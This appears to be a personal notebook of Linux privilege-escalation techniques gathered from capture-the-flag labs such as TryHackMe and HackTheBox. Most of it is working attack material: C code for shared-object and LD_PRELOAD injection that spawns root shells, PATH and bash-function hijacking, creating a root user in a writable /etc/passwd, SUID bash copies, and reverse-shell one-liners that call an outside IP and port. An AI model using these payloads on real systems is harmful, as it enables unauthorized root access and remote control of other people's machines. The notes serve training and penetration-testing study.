Privilege Escillation

10/11/2020 21:12

tip: if you find any script running as cron job and that is attached to a script then you can 

copy the bash to tmp/bash
then 
set suid bit chmod 4755 /tmp/bash to get it executed by user we are and that script in which we will do it should be run by root
refrence: [Startup-THM](https://tryhackme.com/room/startup)


tip2: also if any script running as root then do cat root/root.txt > /tmp/flag then boom

14/11/2020 03:16

There are two main privilege escalation variants:

**Horizontal privilege escalation:** This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]

**Vertical privilege escalation (privilege elevation):** This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]


# Common PrivEsc Linux

**LinuEnum:** This is broken down into few important parts.
* **Kernel** To check if there is any kernel exploit available. (**dirtycow** - 2.6.32-5-amd64)
* **Read/write sesitive files** Check if you are able to read and write on files which you should not have access to. `openssl passwd 123` to generate hash
* **SUID files** (Set owner User ID up on execution) is a special type of file permission that is given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges.
* **Crontab Contents** The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as "cron jobs". Related to this is the crontab command which creates a crontab file containing and instructions for the cron daemon to execute. There is certainly enough information to warrent attempting to exploit Cronjobs here.

# SUID binary 

4 - SUID bit set to the user(owner)
2 - SGID bit


prepend 4 or 2 like 755 -> 4755 this means uses will also be execute that binary 

### Finding SUID binaries
`find / -perm -u=s -type f 2>/dev/null`

### Known exploits
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign

*As you can see `exim-4.48.3` is a suid having a service specified so we will search for the exploit and boom*

### Shared Object Injection
Hunt: `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`
Output:
open("/lib/libc.so.6", O_RDONLY)        = 3
open("==/home/user/.config/libcalc.so==", O_RDONLY) = -1 ENOENT (No such file or directory)

*So we can see that libcalc.so cannt found so we will make it and then obtain shell*
1. Make libcalc.c
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}

```
2. Execute ==gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c==
3. Now again execute suid-so.

### Environment Variables
Hunt: ``strings /usr/local/bin/suid-env``
Output:
```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

1. Make shell executable service from service.c and same code: ``gcc -o service /home/user/tools/suid/service.c``
2. Set the PATH again `PATH=.:$PATH /usr/local/bin/suid-env `
3. Boom

### Abusing shell features 1

In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
Example: `function /usr/sbin/service { /bin/bash -p; }`
Hunt: 
1. check for bash version
2. check vuln binary `strings /usr/local/bin/suid-env2`
Output:
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start

3. execute 
```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```
4. Exploit: 
```
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```
-f = for exporting functions

### Abusing shell features 2


## Writable /etc/passwd

first we need to create password 
`openssl passwd -1 -salt [salt] [password]`
ex:
openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1

then add 
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` to the passwd file from the user which have write permissions

or use
`find / -not -type 1 -perm -o+w 2>/dev/null`

## GTFObins
`NOPASSWD: /usr/bin/vi` 

so for this as mentiond on this website 

sudo vi
:!sh
id

finish

# Crontab

`crontab -l` this will list the cron jobs for the current user
`cat /etc/crontab` this will list all the cronjobs available in system

**Netcat** `bash -i >& /dev/tcp/[IP]/[PORT] 0>&1`

### PATH var exploitation
For this one in crontab if the absolute path is not given of the file to be execute ex: 
`* * * * * root overwrite.sh`
so we can create overwrite.sh in home dir and re set the PATH var to home by which now cron will execute our overwrite.sh
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
PATH is alread home is in that then it will work. otherwise set your own like below.

### Wildcards
When a wildcard `(*)` is provided to a command as part of an argument, the shell will first perform filename expansion 
This replaces the wildcard with a space-seperated list 	of the file and dir names in the current dir.
- If you see `/bin/sh -c cd /home/tony && tar -zcf /var/backups/tony.tgz \*` wildcard like this then go for the [Tar cron 2 root](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e)
[Lab for tar wildcard escalation](https://attackdefense.com/challengedetails?cid=74)
[tryhackme box](https://tryhackme.com/room/linuxprivesc)

### Schedule Tasks
1. Use `linpeas.sh` to check if something is in the cron or any other.
2. Use `pspy` to check the runtime processes.
![](https://i.imgur.com/zVAVFsV.png)

## PATH variable exploitation

Its a environment variable that specifies the dirs that holds executable programs. When the user runs any command in terminal, it searches for executable files with the help of the PATH var.

`echo $PATH`
so make a executable file in `/tmp` then 

`PATH=/tmp:$PATH`

then whenever you execute ls which was your custom bin made in tmp will be execute other than real ls hence will be executing our real exploit.

# Sudo privilege escalation
#### (LD_PRELOAD)
**Detection:**
Linux VM
1. In command type: `sudo -l`
2. From the output if you see the `LD_PRELOAD` environment variable is intact.
#### Explaination
1. Use the code:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init(){
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

3. In command type:
`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command type:
`sudo LD_PRELOAD=/tmp/x.so apache2`
BOOM....!

# Path Escalation
Real scenario in laboratory.htb
Found a vulnerable `docker-security` binary to path privilage escalation.
So i ltraced the application for the calls:
![](https://i.imgur.com/fI3if3X.png)
So as we can see this application calling chmod to get some permissions so this is the vulnerablility 
we will forge a new binary of chmod and then change the paths
![](https://i.imgur.com/jYctnis.png)

so here i come in tmp dir and then i made the chmod binary and then set the new path


*****

![](https://i.imgur.com/GzRCSPr.png)
_**Previous path**_
![](https://i.imgur.com/yuFQamn.png)
_**New path**_




# Stored passwords and shared servers
Use the `grep -nr "db_user" .` to get juicy passwords.

# Restricted Shell
#### rbash
If you are in rbash then [this](https://attackdefense.com/challengedetails?cid=97) will help.
#### chroot jail
```
#inlcude<stdlib.h>
#include<sys/stat.h>
#include <unistd.h>
int main(void){
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i< 1000; i++)
{
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```

# Services running on server
`ps aux | grep "^root"` gives you the running services as root
then
`service --version` will give the version of service so that we can find the exploit.

# NFS
Hunt: check for `cat /etc/exports`







# Priv esc tip
1. If you are on other network and looking for shell then open new terminal login in same network and then listen for the priv escalated shell
2. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/home/tony/nc 172.17.0.3 1337 >/tmp/f` always works even in cronjobs if you get the chance to exploit then use this one.
3. If you get 127.0.0.1:1234 running then also by tunneling try `nc` and browser


# Ret2libc
- An attack technique that relies on overwriting the program stack to create a new stack frame that calls the system function
- Stands for "return to library call".

# Strategy 
# Resources for checklist

* https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
* https://payatu.com/guide-linux-privilege-escalation